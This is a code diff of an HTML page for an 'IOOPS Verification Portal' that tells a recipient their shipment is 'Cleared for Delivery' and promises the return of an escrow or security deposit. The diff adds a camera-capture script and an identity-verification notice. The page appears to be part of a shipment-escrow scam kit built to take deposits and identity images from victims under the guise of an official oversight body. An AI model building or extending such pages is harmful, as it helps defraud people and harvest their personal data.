-                                <span class="info-value"><strong id="completion-tracking-id"></strong></span>
-                            </div>
-                            <div class="info-row">
-                                <span class="info-label">Verification Completed:</span>
-                                <span class="info-value" id="completion-date"></span>
-                            </div>
-                            <div class="info-row">
-                                <span class="info-label">Status:</span>
-                                <span class="info-value"><span class="status-badge status-complete">Cleared for Delivery</span></span>
-                            </div>
-                        </div>
-
-                        <div class="escrow-return-notice">
-                            <h3>💰 Escrow Deposit Return</h3>
-                            <p>Your escrow deposit of <strong>EUR €<span id="escrow-return-amount"></span></strong> will be returned within <strong><span id="escrow-return-days"></span> business days</strong> from the completion date above.</p>
-                            <p class="return-date">Expected return date: <strong id="escrow-return-date"></strong></p>
-                            <p class="return-info">The deposit will be returned to the account from which the payment originated. No action is required on your part.</p>
-                        </div>
-
-                        <div class="receipt-download-section">
-                            <h3>📄 Official Verification Receipt</h3>
-                            <p>Download your official IOOPS verification completion receipt for your records.</p>
-                            <button id="download-receipt-btn" class="btn-download-receipt">
-                                <span class="btn-icon">📄</span> Download PDF Receipt
-                            </button>
-                        </div>
-
-                        <div class="next-steps-complete">
-                            <h3>What Happens Next?</h3>
-                            <ol class="completion-steps-list">
-                                <li><strong>Your shipment is now cleared</strong> for final delivery to your address</li>
-                                <li><strong>You will receive tracking updates</strong> via email as your shipment progresses</li>
-                                <li><strong>The carrier will contact you</strong> to schedule delivery when your shipment arrives</li>
-                                <li><strong>Your escrow deposit</strong> will be automatically returned within <span id="escrow-return-days-2"></span> business days</li>
-                            </ol>
-                        </div>
-
-                        <div class="completion-footer">
-                            <p>Thank you for using the IOOPS Verification Portal. Your cooperation ensures the security and compliance of international shipments.</p>
-                            <p class="footer-note">You may close this page. A confirmation email has been sent to your registered email address.</p>
-                        </div>
+                    <div class="info-notice" style="margin-top: 24px;">
+                        <p style="font-size: 14px; color: var(--text-secondary);"><strong>Note:</strong> This receipt confirms your identity verification was completed successfully. Keep it for your records. Your security deposit will be refunded according to the terms provided.</p>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- Footer -->
         <footer class="portal-footer">
             <p>&copy; 2025 International Oversight & Operations Protocol System (IOOPS). All rights reserved.</p>
-            <p class="footer-links">
-                <a href="privacy-policy.html" target="_blank">Privacy Policy</a> |
-                <a href="terms-of-service.html" target="_blank">Terms of Service</a>
-            </p>
+            <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
         </footer>
     </div>
 
+    <script src="js/camera-capture.js"></script>
     <script src="js/recipient-verification.js"></script>
 </body>
 </html>
